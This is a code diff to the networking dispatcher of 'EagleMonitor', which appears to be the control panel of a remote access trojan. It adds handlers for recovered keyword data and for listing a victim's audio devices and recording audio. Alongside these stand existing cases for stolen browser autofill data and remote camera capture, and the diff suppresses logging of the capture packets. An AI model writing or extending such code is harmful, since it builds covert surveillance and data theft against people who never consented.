@@ -26,6 +26,18 @@ namespace EagleMonitor.Networking
         private void Log(IAsyncResult ar)
         {
             IPacket packet = packetParser.EndInvoke(ar);
+            switch (packet.packetType)
+            {
+                case PacketType.RC_CAPTURE_ON:
+                    return;
+
+                case PacketType.RM_VIEW_ON:
+                    return;
+
+                case PacketType.AUDIO_RECORD_ON:
+                    return;
+            }
+
             Program.logForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
             {
                 int rowId = Program.logForm.dataGridView1.Rows.Add();
@@ -68,6 +80,7 @@ namespace EagleMonitor.Networking
                 }
                 Program.logForm.dataGridView1.ClearSelection();
                 Program.logForm.dataGridView1.CurrentCell = null;
+                packet = null;
             }));
         }
 
@@ -172,6 +185,21 @@ namespace EagleMonitor.Networking
                 case PacketType.RECOVERY_AUTOFILL:
                     AutofillPacket autofillPacket = (AutofillPacket)packet;
                     new AutofillPacketParser(autofillPacket, clientHandler);
+                    break;
+
+                case PacketType.RECOVERY_KEYWORDS:
+                    KeywordsPacket keywordsPacket = (KeywordsPacket)packet;
+                    new KeywordsPacketHandler(keywordsPacket, clientHandler);
+                    break;
+
+                case PacketType.AUDIO_GET_DEVICES:
+                    RemoteAudioPacket remoteAudioPacket = (RemoteAudioPacket)packet;
+                    new RemoteAudioPacketHandler(remoteAudioPacket, clientHandler);
+                    break;
+
+                case PacketType.AUDIO_RECORD_ON:
+                    RemoteAudioCapturePacket remoteAudioCapturePacket = (RemoteAudioCapturePacket)packet;
+                    new RemoteAudioCapturePacketHandler(remoteAudioCapturePacket, clientHandler);
                     break;
 
             }
